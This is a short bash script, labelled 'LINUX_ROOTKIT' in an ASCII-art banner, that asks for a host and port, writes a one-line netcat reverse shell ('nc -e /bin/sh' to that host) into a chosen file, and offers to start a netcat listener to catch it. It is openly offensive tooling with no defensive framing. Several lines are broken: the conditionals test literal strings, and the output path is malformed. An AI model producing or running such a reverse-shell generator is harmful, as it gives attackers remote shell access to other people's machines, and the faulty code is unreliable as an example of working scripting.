#!/bin/bash
echo "      ▄▄        ▄▄  ▄▄▄▄▄▄▄▄                                ▄▄        ▄▄ $
      ██        ██   ▀▀▀▀▀███                        ██       █▄        █▄
     ██        ██        ██▀    ▄████▄    ██▄████  ███████     █▄        █▄
    ██        ██       ▄██▀    ██▄▄▄▄██   ██▀        ██         █▄        █▄
   ▄█▀       ▄█▀      ▄██      ██▀▀▀▀▀▀   ██         ██          █▄        █▄
  ▄█▀       ▄█▀      ███▄▄▄▄▄  ▀██▄▄▄▄█   ██         ██▄▄▄        █▄        █▄
 ▄█▀       ▄█▀       ▀▀▀▀▀▀▀▀    ▀▀▀▀▀    ▀▀          ▀▀▀▀         █▄        █▄
                               LINUX_ROOTKIT

"
read -p 'Server host: ' host
read -p 'Port: ' port
if [[ (host!="") && (port!="") ]]; then
echo "Generating rootkit..."
read -p 'Directory to save: ' dir
echo nc -e /bin/sh $host $port > $dir#back".sh"
read -p 'Do you want to start server?Y/n: ' ser
 if [[ (ser=="Y") && (ser=="y") ]]; then
 echo "Starting server:"$host"_with_port:" $port 
 nc -l -p $port 
 else
 echo "Ok,goodbye..."
 exit
 fi
fi


